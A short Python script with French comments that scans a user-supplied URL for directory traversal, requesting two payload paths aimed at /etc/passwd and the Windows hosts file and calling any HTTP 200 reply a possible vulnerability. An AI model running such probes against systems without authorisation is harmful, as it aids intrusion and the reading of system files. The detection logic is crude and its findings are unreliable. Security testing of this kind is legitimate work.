import requests

def check_directory_traversal(url):
    # Liste des payloads potentiels pour le directory traversal
    payloads = [
        '../etc/passwd',
        '../Windows/System32/drivers/etc/hosts'
    ]

    for payload in payloads:
        target_url = f"{url}/{payload}"
        response = requests.get(target_url)

        if response.status_code == 200:
            print(f"Vulnérabilité potentielle trouvée : {target_url}")
        else:
            print(f"Aucune vulnérabilité trouvée pour : {target_url}")

if __name__ == "__main__":
    target_url = input("Entrez l'URL à scanner (ex: http://example.com): ")
    check_directory_traversal(target_url)
    